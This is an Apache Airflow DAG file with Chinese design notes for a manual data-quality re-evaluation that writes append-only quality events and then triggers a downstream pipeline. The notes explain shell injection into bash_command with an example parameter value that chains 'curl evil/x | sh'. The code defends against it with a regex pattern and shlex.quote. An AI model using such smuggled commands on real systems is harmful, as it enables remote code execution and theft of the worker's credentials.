"""Proposal B：規則升版後的重評估（手動觸發）。

    reevaluate ─► should_refresh (commit 才通過) ─► trigger orders_analytics_daily

事件產生端是 `reevaluate_quality.py`；本 DAG 只負責「什麼時候跑、跑完接什麼」。
設計與邊界見 docs/zh-TW/design/data-quality.md〈Proposal B〉與 docs/zh-TW/design/orchestration.md。

────────────────────────────────────────────────────────────────────────────
① `schedule=None`：這是**事件驅動的操作，不是週期性作業** ⭐
   Proposal B 的觸發條件是「規則放寬了」，那是人為的部署事件。規則沒變時，
   重評估的結果必然與上次相同（同一批值、同一版規則）→ 不會產生任何事件，
   卻要對全歷史 quarantine 做一次完整掃描。排成日批＝364 天的白工換 1 天的效果。
   排程的正確對象是「資料會自己變的東西」；規則不會自己變。

② 預設 dry-run，`commit` 必須顯式打開 ⭐
   `quality_events` 是 append-only，寫錯刪不掉。手動觸發的 UI 上很容易一路點下去，
   所以把「真的寫」做成必須主動勾選的參數，而不是預設行為。

③ `expect_rule_version` 是防呆，不是設定
   事件會帶著 `rule_version` 永久留存。手動觸發最常見的意外是「打在還沒部署新規則的
   環境上」——那會寫出一批標著舊版本號、卻用舊規則評出來的事件，而且無法撤銷。
   填入你**預期**的版本，不符就中止。

④ 跑完接主 DAG，但只在 commit 時 ⭐
   重評估寫的是 PG 的 `quality_events`；要讓資料真的回流 Gold，還需要
   extract_quality_events 把事件送上 BQ、再由 int_ 全量重建。少了這一步，
   狀態會是「我跑了 Proposal B 但什麼都沒發生」——最容易誤判成程式壞掉的狀態。
   dry-run 時不觸發：沒有寫入就沒有東西需要傳播。

⑤ retries=0
   這是人工觸發、有人盯著的操作。雖然 `reevaluate_quality.py` 的「只在狀態改變時
   append」讓重跑本身是安全的，但失敗當下「先看清楚發生什麼事」比自動再對一張
   append-only 表寫一次更重要。

⑥ ⚠️ params 進 bash_command 之前必須「先約束、再引號」——兩層都要 ⭐
   `bash_command` 是字串串接後交給 shell 解析的。一個沒有約束的 string 型 param
   直接插進去，等於把 shell 的**語法**交給填表單的人決定：

       expect_rule_version = "v4; curl evil/x | sh"
       → …reevaluate_quality.py --expect-rule-version v4; curl evil/x | sh
                                                        ↑ 分號之後是另一條命令

   在 worker 容器內執行，而那個容器握有 DB_URL、API_KEYS、GCP 金鑰。
   RBAC 的前提是「trigger DAG」比「改 DAG 程式碼」低權限——這個洞讓兩者等價。

   所以兩層都做，缺一不可：
     · `pattern`（JSON Schema）→ Airflow 在 **UI 就擋掉**，錯誤不會進到 task
     · `| q`（shlex.quote）    → 就算 pattern 日後被放寬，值仍是**單一 shell 參數**

   `limit` / `commit` 本來就安全（integer / boolean 由 Schema 驗證），
   `seed_demo_gate_demo` 的 n / dirty_rate 同理——**string 型才是需要盯的那一種**。
────────────────────────────────────────────────────────────────────────────
"""

from __future__ import annotations

import shlex
from datetime import datetime

from airflow.sdk import DAG, Param
from airflow.providers.standard.operators.bash import BashOperator
from airflow.providers.standard.operators.python import ShortCircuitOperator
from airflow.providers.standard.operators.trigger_dagrun import TriggerDagRunOperator

PROJECT_DIR = "/opt/project"
PY_ANALYTICS = "/home/airflow/venvs/analytics/bin/python"
MAIN_DAG_ID = "orders_analytics_daily"


def _commit_requested(**context) -> bool:
    """dry-run 沒有寫入任何東西，就沒有東西需要傳播到下游（見檔頭 ④）。"""
    return bool(context["params"]["commit"])


with DAG(
    dag_id="dq_reevaluation",
    description="Proposal B：以當前規則重評估被隔離的訂單，append quality_events",
    schedule=None,                 # 見檔頭 ①
    start_date=datetime(2026, 8, 1),
    catchup=False,
    max_active_runs=1,             # 兩個 run 並行會對同一批候選各算一次
    params={
        "commit": Param(
            False, type="boolean",
            title="真的寫入事件",
            description="關閉＝dry-run，只回報會發生什麼。quality_events 是 append-only，"
                        "寫錯刪不掉，故預設不寫（見檔頭 ②）。",
        ),
        "expect_rule_version": Param(
            "", type="string",
            # ⚠️ pattern 是安全邊界，不是格式潔癖——這個值會進 bash_command（見檔頭 ⑥）。
            #    允許空字串（＝不檢查），其餘只收 v + 數字。
            pattern=r"^(v[0-9]+)?$",
            title="預期的 DQ_RULE_VERSION",
            description="留空＝不檢查。填入（如 v3）則部署中的版本不符即中止——"
                        "事件會帶著版本號永久留存，打在舊部署上無法撤銷（見檔頭 ③）。"
                        "格式限 v+數字。",
        ),
        "limit": Param(
            None, type=["null", "integer"], minimum=1,
            title="候選筆數上限",
            description="留空＝不限。分批推進大量 backlog 時使用。",
        ),
    },
    default_args={"owner": "data-eng", "retries": 0},   # 見檔頭 ⑤
    tags=["data-quality", "proposal-b", "manual"],
    doc_md=__doc__,
    # `q` = shlex.quote。任何進 bash_command 的 string 型 param 都要過它（見檔頭 ⑥）。
    # 用 stdlib 而非專案模組，所以不違反「DAG 檔不 import 專案模組」的紀律。
    user_defined_filters={"q": shlex.quote},
) as dag:

    reevaluate = BashOperator(
        task_id="reevaluate",
        # 三個參數都是「留空就不加旗標」，讓預設值由腳本而非 DAG 決定——
        # 兩邊各有一份預設值是漂移的來源。
        # ⚠️ expect_rule_version 過 `| q`：它是唯一的 string 型 param（見檔頭 ⑥）。
        bash_command=(
            f"{PY_ANALYTICS} {PROJECT_DIR}/reevaluate_quality.py"
            "{{ ' --commit' if params.commit else '' }}"
            "{{ ' --limit ' ~ params.limit if params.limit else '' }}"
            "{{ ' --expect-rule-version ' ~ (params.expect_rule_version | q)"
            " if params.expect_rule_version else '' }}"
        ),
    )

    should_refresh = ShortCircuitOperator(
        task_id="should_refresh",
        python_callable=_commit_requested,
    )

    # 事件寫進 PG 之後，要 extract_quality_events 送上 BQ、int_ 全量重建才會回流。
    # 不等它完成：主 DAG 的進度在它自己的 UI 上看得更清楚，這裡等只會讓一個
    # 「人工操作」的 task 掛著十幾分鐘。
    refresh_gold = TriggerDagRunOperator(
        task_id="refresh_gold",
        trigger_dag_id=MAIN_DAG_ID,
        wait_for_completion=False,
        reset_dag_run=False,
    )

    reevaluate >> should_refresh >> refresh_gold
